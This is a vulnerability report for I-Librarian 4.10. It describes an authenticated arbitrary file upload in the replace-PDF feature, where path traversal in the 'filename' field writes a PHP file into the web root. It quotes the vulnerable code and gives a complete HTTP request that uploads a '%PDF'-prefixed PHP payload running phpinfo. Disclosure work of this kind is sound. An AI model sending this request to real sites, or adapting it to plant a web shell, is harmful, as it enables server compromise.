# Detail
Using the replace PDF function, an attacker can upload a file with php as the suffix and %PDF as the beginning of file content to any directory by controlling the filename parameter.
```php
if (in_array($file_extension, array('doc', 'docx', 'vsd', 'xls', 'xlsx', 'ppt', 'pptx', 'odt', 'ods', 'odp')))
  ...
  ...
else
  move_uploaded_file($_FILES['form_new_file']['tmp_name'], IL_TEMP_PATH . DIRECTORY_SEPARATOR . 'lib_' . session_id() . DIRECTORY_SEPARATOR . $_POST['filename']);
```
# Vulnerability reproduction steps

1. Use source code to build a website

[https://github.com/mkucej/i-librarian/releases/tag/4.10](https://github.com/mkucej/i-librarian/releases/tag/4.10)
The main page like this
![image.png](https://cdn.nlark.com/yuque/0/2023/png/23129560/1675049266677-b8c0c198-0fb3-48c8-8c0c-b7dd5864fb69.png#averageHue=%23fafafa&clientId=u4ee82e12-b562-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=750&id=u38464d4f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=937&originWidth=1903&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67188&status=done&style=none&taskId=ua37900ef-d234-4ef5-aea9-ff363820461&title=&width=1522.4)

2. Register an account

You need to register an account and log in to the website.
![image.png](https://cdn.nlark.com/yuque/0/2023/png/23129560/1675069608435-cc94454e-4c41-4197-9306-aa53cb2c7740.png#averageHue=%23e9e9ed&clientId=u4ee82e12-b562-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=538&id=ud993d151&margin=%5Bobject%20Object%5D&name=image.png&originHeight=672&originWidth=1413&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22473&status=done&style=none&taskId=ua33a4a3e-2575-4e8f-8c2f-687903272c9&title=&width=1130.4)

3. Get the cookie

We need to get the cookie and replace the cookie in our poc.
![image.png](https://cdn.nlark.com/yuque/0/2023/png/23129560/1675069774076-d56122e0-fb66-40bd-90b8-2550d4bbb3bd.png#averageHue=%23d39f60&clientId=u4ee82e12-b562-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=268&id=u9fa4e547&margin=%5Bobject%20Object%5D&name=image.png&originHeight=335&originWidth=1741&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53080&status=done&style=none&taskId=uadd7da14-b52a-46d2-afad-81df4a42ed7&title=&width=1392.8)

poc like this
```
POST /ajaxsupplement.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------36332819052109193833351732483
Content-Length: 981
Origin: http://127.0.0.1
DNT: 1
Connection: close
Referer: http://127.0.0.1/index2.php
Cookie: PHPSESSID=i7l1jt5cp8bbgt41p888aii2r7
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------36332819052109193833351732483
Content-Disposition: form-data; name="file"

1
-----------------------------36332819052109193833351732483
Content-Disposition: form-data; name="filename"

../../z.php
-----------------------------36332819052109193833351732483
Content-Disposition: form-data; name="form_new_file"; filename="1.php"
Content-Type: application/pdf

%PDF
<?php phpinfo();?>
-----------------------------36332819052109193833351732483
Content-Disposition: form-data; name="form_new_file_link"


-----------------------------36332819052109193833351732483
Content-Disposition: form-data; name="form_graphical_abstract"


-----------------------------36332819052109193833351732483
Content-Disposition: form-data; name="form_supplementary_file[]"


-----------------------------36332819052109193833351732483
Content-Disposition: form-data; name="proxystr"


-----------------------------36332819052109193833351732483--


```

4. Send poc to test site

We use burpsuit to send poc then we can see that a file called z.php exists in the root directory of the website.
![image.png](https://cdn.nlark.com/yuque/0/2023/png/23129560/1675070183363-4304296c-fb15-4df3-885a-2f92e07cb40b.png#averageHue=%23f9f9f9&clientId=u4ee82e12-b562-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=586&id=u3492e1f9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=732&originWidth=1222&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86615&status=done&style=none&taskId=ud7f3b404-c860-44ed-80b4-9082274e178&title=&width=977.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/23129560/1675069947553-9b4d19e1-8a31-4445-a4ca-97935cb773c8.png#averageHue=%23fbfaf9&clientId=u4ee82e12-b562-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=462&id=uc228230e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=578&originWidth=481&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33186&status=done&style=none&taskId=ucd3cae24-090a-4dfc-b3a0-98a557c99aa&title=&width=384.8)
